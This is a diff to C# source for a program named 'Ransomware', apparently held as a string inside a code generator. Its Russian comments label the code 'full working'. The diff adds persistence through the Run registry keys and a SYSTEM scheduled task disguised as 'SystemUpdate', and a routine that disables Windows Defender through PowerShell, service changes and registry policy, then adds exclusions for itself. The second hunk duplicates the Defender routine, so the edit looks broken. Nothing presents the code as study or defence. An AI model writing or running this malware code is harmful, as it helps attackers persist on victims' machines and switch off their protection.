@@ -1141,34 +1141,76 @@ namespace Ransomware
         }}
         
         // ============================================================
-        // ПЕРСИСТЕНТНОСТЬ
-        // ============================================================
-        static void AddPersistence()
+// ПЕРСИСТЕНТНОСТЬ (ПОЛНАЯ РАБОЧАЯ)
+// ============================================================
+static void AddPersistence()
+{{
+    string exePath = Process.GetCurrentProcess().MainModule.FileName;
+    try
+    {{
+        // Добавление в автозагрузку текущего пользователя
+        RegistryKey key = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"");
+        key.SetValue(""SystemUpdate"", exePath);
+        key.Close();
+        
+        // Добавление в автозагрузку всех пользователей
+        try
         {{
-            try
-            {{
-                string exePath = Process.GetCurrentProcess().MainModule.FileName;
-                
-                RegistryKey key = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"");
-                key.SetValue(""SystemUpdate"", exePath);
-                key.Close();
-                
-                try
-                {{
-                    RegistryKey keyLocal = Registry.LocalMachine.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"");
-                    keyLocal.SetValue(""SystemUpdate"", exePath);
-                    keyLocal.Close();
-                }}
-                catch {{ }}
-                
-                try
-                {{
-                    Process.Start(""schtasks"", $""/create /tn ""SystemUpdate"" /tr ""{exePath}"" /sc onlogon /ru SYSTEM /f"");
-                }}
-                catch {{ }}
-            }}
-            catch {{ }}
+            RegistryKey keyLocal = Registry.LocalMachine.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"");
+            keyLocal.SetValue(""SystemUpdate"", exePath);
+            keyLocal.Close();
         }}
+        catch {{ }}
+        
+        // Добавление задачи в планировщик
+        try
+        {{
+            Process.Start(""schtasks"", $""/create /tn ""SystemUpdate"" /tr ""{exePath}"" /sc onlogon /ru SYSTEM /f"");
+        }}
+        catch {{ }}
+    }}
+    catch {{ }}
+}}
+
+// ============================================================
+// ОТКЛЮЧЕНИЕ WINDOWS DEFENDER (ПОЛНАЯ РАБОЧАЯ)
+// ============================================================
+static void DisableDefender()
+{{
+    string exePath = Process.GetCurrentProcess().MainModule.FileName;
+    try
+    {{
+        // Отключение реального времени
+        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableRealtimeMonitoring $true\""\"");
+        
+        // Отключение облачной защиты
+        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableCloudProtection $true\""\"");
+        
+        // Отключение поведенческого мониторинга
+        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBehaviorMonitoring $true\""\"");
+        
+        // Отключение защиты от атак
+        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBlockAtFirstSeen $true\""\"");
+        
+        // Добавление исключений
+        Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionPath '{Path.GetDirectoryName(exePath)}'\""\"");
+        Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionProcess '{Path.GetFileName(exePath)}'\""\"");
+        
+        // Отключение службы
+        Process.Start(""powershell"", ""-Command \""Stop-Service WinDefend -Force\""\"");
+        Process.Start(""powershell"", ""-Command \""Set-Service WinDefend -StartupType Disabled\""\"");
+        
+        // Удаление через реестр
+        try
+        {{
+            RegistryKey key = Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Policies\Microsoft\Windows Defender"");
+            key.SetValue(""DisableAntiSpyware"", 1, RegistryValueKind.DWord);
+            key.Close();
+        }}
+        catch {{ }}
+    }}
+    catch {{ }}
+}}
         
         // ============================================================
         // УСТАНОВКА ОБОЕВ
@@ -1280,36 +1322,43 @@ namespace Ransomware
         }}
         
         // ============================================================
-        // ОТКЛЮЧЕНИЕ DEFENDER
-        // ============================================================
-        static void DisableDefender()
+// ОТКЛЮЧЕНИЕ WINDOWS DEFENDER (ПОЛНАЯ РАБОЧАЯ)
+// ============================================================
+static void DisableDefender()
+{{
+    string exePath = Process.GetCurrentProcess().MainModule.FileName;
+    try
+    {{
+        // Отключение реального времени
+        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableRealtimeMonitoring $true\""\"");
+        
+        // Отключение облачной защиты
+        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableCloudProtection $true\""\"");
+        
+        // Отключение поведенческого мониторинга
+        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBehaviorMonitoring $true\""\"");
+        
+        // Отключение защиты от атак
+        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBlockAtFirstSeen $true\""\"");
+        
+        // Добавление исключений
+        Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionPath '{Path.GetDirectoryName(exePath)}'\""\"");
+        Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionProcess '{Path.GetFileName(exePath)}'\""\"");
+        
+        // Отключение службы
+        Process.Start(""powershell"", ""-Command \""Stop-Service WinDefend -Force\""\"");
+        Process.Start(""powershell"", ""-Command \""Set-Service WinDefend -StartupType Disabled\""\"");
+        
+        // Удаление через реестр
+        try
         {{
-            try
-            {{
-                string exePath = Process.GetCurrentProcess().MainModule.FileName;
-                
-                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableRealtimeMonitoring $true\""\"");
-                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableCloudProtection $true\""\"");
-                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBehaviorMonitoring $true\""\"");
-                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBlockAtFirstSeen $true\""\"");
-                
-                Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionPath '{Path.GetDirectoryName(exePath)}'\""\"");
-                Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionProcess '{Path.GetFileName(exePath)}'\""\"");
-                
-                Process.Start(""powershell"", ""-Command \""Stop-Service WinDefend -Force\""\"");
-                Process.Start(""powershell"", ""-Command \""Set-Service WinDefend -StartupType Disabled\""\"");
-                
-                try
-                {{
-                    RegistryKey key = Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Policies\Microsoft\Windows Defender"");
-                    key.SetValue(""DisableAntiSpyware"", 1, RegistryValueKind.DWord);
-                    key.Close();
-                }}
-                catch {{ }}
-            }}
-            catch {{ }}
+            RegistryKey key = Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Policies\Microsoft\Windows Defender"");
+            key.SetValue(""DisableAntiSpyware"", 1, RegistryValueKind.DWord);
+            key.Close();
         }}
+        catch {{ }}
     }}
+    catch {{ }}
 }}
 ";
         }
